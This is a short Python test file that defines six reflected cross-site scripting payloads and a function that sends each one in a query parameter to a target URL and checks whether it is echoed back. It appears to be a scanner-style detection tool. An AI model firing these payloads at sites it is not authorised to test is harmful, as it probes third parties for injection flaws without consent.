# tests/test_xss.py

import requests

# Define payloads for XSS tests, including common and edge-case payloads
xss_payloads = [
    "<script>alert('XSS')</script>",                # Basic script injection
    "<img src='x' onerror='alert(1)'>",             # Image tag with onerror event handler
    "<body onload=alert(1)>",                        # Body onload event to trigger JS on page load
    "<svg onload=alert(1)>",                         # SVG image-based event handler (modern XSS vector)
    "<a href='javascript:alert(1)'>Click me</a>",    # JavaScript URI handler in an anchor tag
    "<script src='http://example.com/xss.js'></script>" # External script loading (classic XSS)
]

def test_xss(url):
    """
    Tests for Cross-Site Scripting (XSS) vulnerabilities by sending various payloads that
    include script injections and checking if they are reflected back in the response.

    :param url: The target URL to test for reflected XSS vulnerabilities.
    :return: A list of results indicating whether the target is vulnerable to XSS for each payload.
    """
    results = []

    for payload in xss_payloads:
        try:
            # Construct the target URL with the XSS payload
            target_url = f"{url}?q={payload}"

            # Send GET request to the target URL
            response = requests.get(target_url)

            # Check if the payload is reflected in the response text (indicating XSS vulnerability)
            if payload in response.text:
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "reason": f"Reflected payload detected in response, indicating potential XSS. Status code: {response.status_code}"
                })
            else:
                results.append({
                    "payload": payload,
                    "vulnerable": False,
                    "reason": f"No XSS vulnerability detected. Status code: {response.status_code}"
                })
        
        except requests.exceptions.RequestException as e:
            # Handle network-related errors and log them in results
            results.append({
                "payload": payload,
                "vulnerable": False,
                "reason": f"Request failed: {e}"
            })
    
    return results
